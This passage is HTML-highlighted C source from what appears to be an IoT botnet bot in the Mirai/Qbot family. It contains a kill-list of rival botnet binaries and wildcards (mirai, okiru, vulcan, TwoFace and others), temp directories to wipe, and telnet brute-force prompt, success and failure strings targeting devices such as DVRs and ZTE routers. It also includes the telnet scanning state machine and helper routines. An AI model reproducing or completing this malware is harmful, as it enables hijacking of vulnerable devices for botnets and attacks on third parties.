class="string">&quot;kmymipsel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmysh2eb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmysh2elf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmysh4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyx86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyarmv5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyarmv4tl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyarmv4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyarmv6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyi686&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmypowerpc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmypowerpc440fp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyi586&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmym68k&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmysparc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kmyx86_64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolmips&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolmips64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolmipsel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolsh2eb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolsh2elf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolsh4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolx86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolarmv5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolarmv4tl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolarmv4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolarmv6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;loli686&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mirai.linux&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mirai.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mirai*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolpowerpc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolpowerpc440fp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;loli586&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolm68k&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lolsparc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;RYrydry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telmips&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telmips64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telmipsel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telsh2eb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telsh2elf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telsh4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telx86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telarmv5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telarmv4tl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telarmv4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telarmv6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;teli686&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telpowerpc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telpowerpc440fp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;teli586&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telm68k&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telsparc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;telx86_64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacemips&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacemips64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacemipsel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacesh2eb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacesh2elf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacesh4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacex86&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacearmv5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacearmv4tl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacearmv4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacearmv6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacei686&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacepowerpc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacepowerpc440fp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacei586&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacem68k&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacesparc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;TwoFacex86_64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UYyuyioy&quot;</span>,</span><br><span class="line">    <span class="string">&quot;XDzdfxzf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb13&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb14&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb15&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb16&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb19&quot;</span>,</span><br><span class="line">    <span class="string">&quot;xxb20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;13&quot;</span>,</span><br><span class="line">    <span class="string">&quot;14&quot;</span>,</span><br><span class="line">    <span class="string">&quot;15&quot;</span>,</span><br><span class="line">    <span class="string">&quot;16&quot;</span>,</span><br><span class="line">    <span class="string">&quot;17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;19&quot;</span>,</span><br><span class="line">    <span class="string">&quot;20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bb&quot;</span>,</span><br><span class="line">    <span class="string">&quot;busybotnet&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pppd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pppoe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wput&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B13&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B14&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B15&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B16&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B20&quot;</span>,</span><br><span class="line">	<span class="string">&quot;DVR&quot;</span>,</span><br><span class="line">	<span class="string">&quot;*mirai&quot;</span>,</span><br><span class="line">	<span class="string">&quot;*.mirai&quot;</span>,</span><br><span class="line">	<span class="string">&quot;cunty*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;IoT*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mips64&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sh4&quot;</span>,</span><br><span class="line">	<span class="string">&quot;arm&quot;</span>,</span><br><span class="line">	<span class="string">&quot;armv5&quot;</span>,</span><br><span class="line">	<span class="string">&quot;armv4tl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;armv4&quot;</span>,</span><br><span class="line">	<span class="string">&quot;armv6&quot;</span>,</span><br><span class="line">	<span class="string">&quot;powerpc&quot;</span>,</span><br><span class="line">	<span class="string">&quot;powerpc440fp&quot;</span>,</span><br><span class="line">	<span class="string">&quot;pc&quot;</span>,</span><br><span class="line">	<span class="string">&quot;m68k&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sparc&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mirai.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;orion.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;okiru.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;nightcore.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;ar&quot;</span>,</span><br><span class="line">	<span class="string">&quot;lsp.modz&quot;</span>,</span><br><span class="line">	<span class="string">&quot;mipsxd&quot;</span>,</span><br><span class="line">	<span class="string">&quot;die.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dupessh&quot;</span></span><br><span class="line">	<span class="string">&quot;*mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;*.mips&quot;</span>,</span><br><span class="line">	<span class="string">&quot;pps&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sh4*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;wget*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;ssh*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vulcan&quot;</span>, </span><br><span class="line">	<span class="string">&quot;jennifer*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;okiru*&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vulcana&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vulcanb&quot;</span>, </span><br><span class="line">	<span class="string">&quot;vulcand&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vulcane&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vulcanx&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vulcany&quot;</span>,</span><br><span class="line">	<span class="string">&quot;vulcanz&quot;</span>, </span><br><span class="line">	<span class="string">&quot;vulcang&quot;</span>,</span><br><span class="line">	<span class="string">&quot;apache2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;telnetd&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *Temp_Directorys[] = &#123;<span class="string">&quot;/tmp/*&quot;</span>, <span class="string">&quot;/root/tmp/*&quot;</span>, <span class="string">&quot;/temp/*&quot;</span>, <span class="string">&quot;/var/*&quot;</span>, <span class="string">&quot;/var/run/*&quot;</span>, <span class="string">&quot;/var/tmp/*&quot;</span>,  (<span class="keyword">char</span>*) <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *advances[] = &#123;<span class="string">&quot;:&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;ogin&quot;</span>, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;pass&quot;</span>, <span class="string">&quot;dvrdvs&quot;</span>, <span class="string">&quot;mdm9625&quot;</span>, <span class="string">&quot;9615-cdp&quot;</span>, <span class="string">&quot;F600&quot;</span>, <span class="string">&quot;F660&quot;</span>, <span class="string">&quot;F609&quot;</span>, <span class="string">&quot;BCM&quot;</span>, (<span class="keyword">char</span>*)<span class="number">0</span>&#125;; 																					</span><br><span class="line"><span class="keyword">char</span> *fails[] = &#123;<span class="string">&quot;nvalid&quot;</span>, <span class="string">&quot;ailed&quot;</span>, <span class="string">&quot;ncorrect&quot;</span>, <span class="string">&quot;enied&quot;</span>, <span class="string">&quot;rror&quot;</span>, <span class="string">&quot;oodbye&quot;</span>, <span class="string">&quot;bad&quot;</span>, (<span class="keyword">char</span>*)<span class="number">0</span>&#125;; 														</span><br><span class="line"><span class="keyword">char</span> *successes[] = &#123;<span class="string">&quot;busybox&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;shell&quot;</span>, <span class="string">&quot;dvrdvs&quot;</span>, <span class="string">&quot;mdm9625&quot;</span>, <span class="string">&quot;9615-cdp&quot;</span>, <span class="string">&quot;F600&quot;</span>, <span class="string">&quot;F660&quot;</span>, <span class="string">&quot;F609&quot;</span>, <span class="string">&quot;BCM&quot;</span>, (<span class="keyword">char</span>*)<span class="number">0</span>&#125;; 																									</span><br><span class="line"><span class="keyword">char</span> *advances2[] = &#123;<span class="string">&quot;nvalid&quot;</span>, <span class="string">&quot;ailed&quot;</span>, <span class="string">&quot;ncorrect&quot;</span>, <span class="string">&quot;enied&quot;</span>, <span class="string">&quot;rror&quot;</span>, <span class="string">&quot;oodbye&quot;</span>, <span class="string">&quot;bad&quot;</span>, <span class="string">&quot;busybox&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;#&quot;</span>, (<span class="keyword">char</span>*)<span class="number">0</span>&#125;;			</span><br><span class="line"><span class="comment">// END OF CONFIG STOP EDITING FROM HERE</span></span><br><span class="line"><span class="comment">// //--------------------------------------------------------------------------------------------------------------------------------------------------------------------		</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHI 0x9e3779b9</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint32_t</span> Q[<span class="number">4096</span>], c = <span class="number">362436</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_rand</span><span class="params">(<span class="keyword">uint32_t</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        Q[<span class="number">0</span>] = x;</span><br><span class="line">        Q[<span class="number">1</span>] = x + PHI;</span><br><span class="line">        Q[<span class="number">2</span>] = x + PHI + PHI;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">3</span>; i &lt; <span class="number">4096</span>; i++) Q[i] = Q[i - <span class="number">3</span>] ^ Q[i - <span class="number">2</span>] ^ PHI ^ i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">rand_cmwc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> t, a = <span class="number">18782LL</span>;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">uint32_t</span> i = <span class="number">4095</span>;</span><br><span class="line">        <span class="keyword">uint32_t</span> x, r = <span class="number">0xfffffffe</span>;</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">4095</span>;</span><br><span class="line">        t = a * Q[i] + c;</span><br><span class="line">        c = (<span class="keyword">uint32_t</span>)(t &gt;&gt; <span class="number">32</span>);</span><br><span class="line">        x = t + c;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; c) &#123;</span><br><span class="line">                x++;</span><br><span class="line">                c++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (Q[i] = r - x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">contains_string</span><span class="params">(<span class="keyword">char</span>* buffer, <span class="keyword">char</span>** strings)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num_strings = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(num_strings = <span class="number">0</span>; strings[++num_strings] != <span class="number">0</span>; );</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; num_strings; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(strcasestr(buffer, strings[i])) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">contains_success</span><span class="params">(<span class="keyword">char</span>* buffer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> contains_string(buffer, successes);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">contains_fail</span><span class="params">(<span class="keyword">char</span>* buffer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> contains_string(buffer, fails);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">contains_response</span><span class="params">(<span class="keyword">char</span>* buffer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> contains_success(buffer) || contains_fail(buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_with_timeout</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> timeout_usec, <span class="keyword">char</span>* buffer, <span class="keyword">int</span> buf_size)</span> </span>&#123;       </span><br><span class="line">        fd_set read_set;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">        tv.tv_sec = <span class="number">0</span>;</span><br><span class="line">        tv.tv_usec = timeout_usec;</span><br><span class="line">        FD_ZERO(&amp;read_set);</span><br><span class="line">        FD_SET(fd, &amp;read_set);</span><br><span class="line">        <span class="keyword">if</span> (select(fd+<span class="number">1</span>, &amp;read_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;tv) &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> recv(fd, buffer, buf_size, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_until_response</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> timeout_usec, <span class="keyword">char</span>* buffer, <span class="keyword">int</span> buf_size, <span class="keyword">char</span>** strings)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num_bytes, i;</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, buf_size);</span><br><span class="line">        num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);</span><br><span class="line">        <span class="keyword">if</span>(buffer[<span class="number">0</span>] == <span class="number">0xFF</span>) &#123;</span><br><span class="line">                negotiate(fd, buffer, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(contains_string(buffer, strings)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">get_telstate_host</span><span class="params">(struct <span class="keyword">telstate_t</span>* telstate)</span> </span>&#123; <span class="comment">// get host</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">in_addr_ip</span>;</span> </span><br><span class="line">        in_addr_ip.s_addr = telstate-&gt;ip;</span><br><span class="line">        <span class="keyword">return</span> inet_ntoa(in_addr_ip);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">advance_telstate</span><span class="params">(struct <span class="keyword">telstate_t</span>* telstate, <span class="keyword">int</span> new_state)</span> </span>&#123; <span class="comment">// advance</span></span><br><span class="line">        <span class="keyword">if</span>(new_state == <span class="number">0</span>) &#123;</span><br><span class="line">                close(telstate-&gt;fd);</span><br><span class="line">        &#125;</span><br><span class="line">        telstate-&gt;tTimeout = <span class="number">0</span>;</span><br><span class="line">        telstate-&gt;state = new_state;</span><br><span class="line">        <span class="built_in">memset</span>((telstate-&gt;sockbuf), <span class="number">0</span>, SOCKBUF_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_telstate</span><span class="params">(struct <span class="keyword">telstate_t</span>* telstate)</span> </span>&#123; <span class="comment">// reset</span></span><br><span class="line">        advance_telstate(telstate, <span class="number">0</span>);</span><br><span class="line">        telstate-&gt;complete = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trim</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = <span class="built_in">strlen</span>(str) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">isspace</span>(str[begin])) begin++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((end &gt;= begin) &amp;&amp; <span class="built_in">isspace</span>(str[end])) end--;</span><br><span class="line">        <span class="keyword">for</span> (i = begin; i &lt;= end; i++) str[i - begin] = str[i];</span><br><span class="line"></span><br><span class="line">        str[i - begin] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printchar</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> **str, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (str) &#123;</span><br><span class="line">                **str = c;</span><br><span class="line">                ++(*str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> (<span class="keyword">void</span>)write(<span class="number">1</span>, &amp;c, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prints</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> **out, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="built_in">string</span>, <span class="keyword">int</span> width, <span class="keyword">int</span> pad)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">int</span> pc = <span class="number">0</span>, padchar = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (width &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">register</span> <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">register</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *ptr;</span><br><span class="line">                <span class="keyword">for</span> (ptr = <span class="built_in">string</span>; *ptr; ++ptr) ++len;</span><br><span class="line">                <span class="keyword">if</span> (len &gt;= width) width = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> width -= len;</span><br><span class="line">                <span class="keyword">if</span> (pad &amp; PAD_ZERO) padchar = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(pad &amp; PAD_RIGHT)) &#123;</span><br><span class="line">                <span class="keyword">for</span> ( ; width &gt; <span class="number">0</span>; --width) &#123;</span><br><span class="line">                        printchar (out, padchar);</span><br><span class="line">                        ++pc;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( ; *<span class="built_in">string</span> ; ++<span class="built_in">string</span>) &#123;</span><br><span class="line">                printchar (out, *<span class="built_in">string</span>);</span><br><span class="line">                ++pc;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> ( ; width &gt; <span class="number">0</span>; --width) &#123;</span><br><span class="line">                printchar (out, padchar);</span><br><span class="line">                ++pc;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">printi</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> **out, <span class="keyword">int</span> i, <span class="keyword">int</span> b, <span class="keyword">int</span> sg, <span class="keyword">int</span> width, <span class="keyword">int</span> pad, <span class="keyword">int</span> letbase)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> print_buf[PRINT_BUF_LEN];</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *s;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">int</span> t, neg = <span class="number">0</span>, pc = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> u = i;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                print_buf[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                print_buf[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">return</span> prints (out, print_buf, width, pad);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sg &amp;&amp; b == <span class="number">10</span> &amp;&amp; i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                neg = <span class="number">1</span>;</span><br><span class="line">                u = -i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s = print_buf + PRINT_BUF_LEN<span class="number">-1</span>;</span><br><span class="line">        *s = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (u) &#123;</span><br><span class="line">                t = u % b;</span><br><span class="line">                <span class="keyword">if</span>( t &gt;= <span class="number">10</span> )</span><br><span class="line">                t += letbase - <span class="string">&#x27;0&#x27;</span> - <span class="number">10</span>;</span><br><span class="line">                *--s = t + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                u /= b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (neg) &#123;</span><br><span class="line">                <span class="keyword">if</span>( width &amp;&amp; (pad &amp; PAD_ZERO) ) &#123;</span><br><span class="line">                        printchar (out, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">                        ++pc;</span><br><span class="line">                        --width;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                        *--s = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> pc + prints (out, s, width, pad);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">print</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> **out, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *format, va_list args )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">int</span> width, pad;</span><br><span class="line">        <span class="keyword">register</span> <span class="keyword">int</span> pc = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> scr[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (; *format != <span class="number">0</span>; ++format) &#123;</span><br><span class="line">                <span class="keyword">if</span> (*format == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">                        ++format;</span><br><span class="line">                        width = pad = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">if</span> (*format == <span class="string">&#x27;\0&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">if</span> (*format == <span class="string">&#x27;%&#x27;</span>) <span class="keyword">goto</span> out;</span><br><span class="line">                        <span class="keyword">if</span> (*format == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                                ++format;</span><br><span class="line">                                pad = PAD_RIGHT;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">while</span> (*format == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                                ++format;</span><br><span class="line">                                pad |= PAD_ZERO;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">for</span> ( ; *format &gt;= 